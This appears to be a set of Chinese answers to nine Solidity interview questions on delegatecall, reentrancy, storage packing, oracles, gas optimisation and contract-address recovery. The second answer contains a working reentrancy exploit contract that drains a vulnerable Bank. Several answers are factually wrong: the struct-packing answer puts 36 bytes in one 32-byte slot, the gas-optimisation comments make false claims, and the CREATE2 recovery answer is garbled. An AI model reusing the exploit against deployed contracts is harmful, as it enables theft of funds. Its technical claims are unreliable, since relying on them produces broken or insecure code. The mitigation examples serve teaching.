## 第一题
delegatecall是一种低级的合约交互接口，它可以让一个合约将某个函数调用委托给另一个合约，但是在被委托合约的上下文中执行。被委托合约可以修改委托合约的存储和状态，而不是自己的。同时，delegatecall还保留了原始调用的上下文，也就是说msg.sender, msg.value和msg.data等变量不会改变。

delegatecall的一个主要用途是实现可升级的代理合约。基本思路是将合约的状态和逻辑分离，这样合约的逻辑可以升级而不影响状态。代理合约（存储状态）通过delegatecall将执行委托给逻辑合约（存储业务逻辑）。代理合约保持不变，但可以指向新的逻辑合约，从而模拟协议的升级。


## 第二题
漏洞是重入攻击。
重入攻击是指一个函数向另一个不可信的合约发起外部调用。然后，不可信的合约递归地调用原始函数，并试图耗尽资金。在这个合约里，withdraw()函数将余额设置为零之前，将余额发送给msg.sender。如果msg.sender是一个恶意的合约，它有一个fallback函数，再次调用withdraw()，它就可以反复从Bank合约中提取资金，直到耗尽gas或者Bank合约中的资金。

一个简单的利用合约：
```solidity
contract Exploit {
    Bank bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    function attack() public payable {
        // 存入一定数量的以太币
        bank.deposit{value: msg.value}();
        // 提取相同数量的以太币
        bank.withdraw();
    }

    // 回退函数，再次调用withdraw
    fallback() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }
}
```

## 第三题
1. 使用transfer或send代替call来发送资金，因为它们只允许2300 gas，不足以执行递归调用。
```solidity
contract Bank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        payable (msg.sender).transfer(balance);
        balances[msg.sender] = 0;
    }
}
```
2. 使用互斥锁或状态变量来确保函数只能被调用一次。
```solidity
contract Bank {
    mapping(address => uint) public balances;
    bool private locked;

    modifier noReentrancy() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public noReentrancy {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "send ETH failed");
        balances[msg.sender] = 0;
    }
}
```
3. 遵循检查-生效-交互（Checks-Effects-Interactions）模式，即先检查条件，再更新状态，最后与外部合约交互。
```solidity
contract Bank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0);
        // update state before interaction
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "send ETH failed");
    }
}
```
## 第四题
Struct2 比 Struct1 更节省 gas。
Struct1 和 Struct2 的存储方式不同。Struct1 会占用两个存储槽，因为它的第一个字段 uint32 x 不能和第二个字段 uint256 y 共享一个槽，所以它会占用一个槽的前 4 个字节，而 uint256 y 和 int64 z 会占用另一个槽的前 40 个字节。Struct2 只会占用一个存储槽，因为它的第一个字段 uint256 y 可以和第二个字段 uint32 x 共享一个槽，所以它们会占用一个槽的前 36 个字节，而 int64 z 会占用同一个槽的后 8 个字节

## 第五题
Chainlink和Redstone都是去中心化的区块链预言机网络，它们可以为智能合约提供来自外部数据源的信息，比如币价、天气、体育等。它们的主要区别在于存储和验证数据的方式。

Chainlink将数据存储在交易性区块链上，比如以太坊，这意味着它需要支付高昂的gas费用，并且受到交易速度的限制。Chainlink通过使用可信节点、优质数据和密码学证明来保证数据的可靠性和可用性。

Redstone则利用Arweave区块链来创建低成本的存储，同时提供完整的历史审计记录。Arweave的存储成本比以太坊低一百万倍，使得Redstone能够为客户提供基于可持续的长期商业模式的低成本服务。Redstone通过使用元交易模式来验证信息的完整性，只在链上检查签名。如果出现数据质量的争议，Redstone还提供了一个去中心化的治理机制来解决纠纷

| 特点 | Chainlink | Redstone |
| --- | --- | --- |
| 数据存储 | 交易性区块链 | Arweave区块链 |
| 存储成本 | 高 | 低 |
| 存储可靠性 | 高 | 高 |
| 存储可审计性 | 有限 | 完整 |
| 数据验证 | 密码学证明 | 签名检查 |
| 验证成本 | 高 | 低 |
| 验证速度 | 慢 | 快 |
| 数据质量保障 | 可信节点和优质数据源 | 去中心化治理和保险机制 |

## 第六题
```solidity
function divRoundUp(int256 a, int256 b) public returns (int256) {
    require(b != 0, "Cannot divide by zero");
    require(a != type(int256).min || b != -1, "Overflow");
    int256 q = a / b;
    int256 r = a % b;
    if (r != 0 && (r > 0) == (b > 0)) {
        q += 1;
    }
    return q;
}
```

## 第七题
```solidity
contract GasOptimization {
    uint256 public total;
    function someFunction(uint[] memory input) external {
        // 1. 使用uint8类型代替uint256类型，因为输入数组的元素都小于256，这样可以节省存储空间和gas
        uint8 threshold = 107;
        // 2. 使用uint16类型代替uint256类型，因为total的最大值不会超过input数组长度乘以threshold，这样也可以节省存储空间和gas
        uint16 newTotal = 0;
        // 3. 使用for循环的第三个参数来增加i的值，而不是在循环体中使用i += 1，这样可以减少一次加法运算和赋值运算，节省gas
        for (uint256 i = 0; i < input.length; i += 2) {
            // 4. 使用位运算代替模运算，因为位运算更快更便宜，只需要检查最低位是否为0即可判断是否为偶数
            bool isEven = input[i] & 1 == 0;
            // 5. 使用隐式转换代替显式转换，因为隐式转换不会消耗gas，而显式转换会消耗gas
            bool isLessThanThreshold = input[i] < threshold;
            if (isEven && isLessThanThreshold) {
                // 6. 使用局部变量newTotal代替状态变量total，因为读写状态变量会消耗更多的gas，而读写局部变量只会消耗内存空间
                newTotal += uint16(input[i]);
            }
        }
        // 7. 在循环结束后，一次性更新状态变量total，减少状态变量的写入次数
        total = newTotal;
    }
}
```

## 第八题
条件：
1. 确保在测试网上部署的合约有一个fallback函数，可以在收到以太币时执行任意代码。
2. 确保在测试网上部署的合约使用了CREATE2 opcode来生成地址A1，而不是CREATE opcode。CREATE2 opcode可以根据盐值（salt）来生成不同的地址，而CREATE opcode则只能根据交易哈希来生成地址。
3. 找到一个合适的盐值（salt），使得在主网上使用CREATE2 opcode和相同的构造函数代码时，也能生成同样的地址A1。
怎么做：
满足上述条件后将合约部署到主网，并向地址A1发送一些特殊格式的数据，触发fallback函数，并且利用CREATE2 opcode和盐值（salt）来部署一个新的合约，这个合约可以让您取回地址A1中的以太币。


## 第九题
1. 编写一个不做任何修改storage的但会消耗大量gas的函数，例如无限循环，然后手动设置很高的gas price 和 gas limit 以确保它能被矿工打包并执行
2. 调用一个肯定会执行失败的函数，譬如这个函数中间做了很多操作，并消耗大量的gas,最后结束时，判断require(false,'Just fail'!)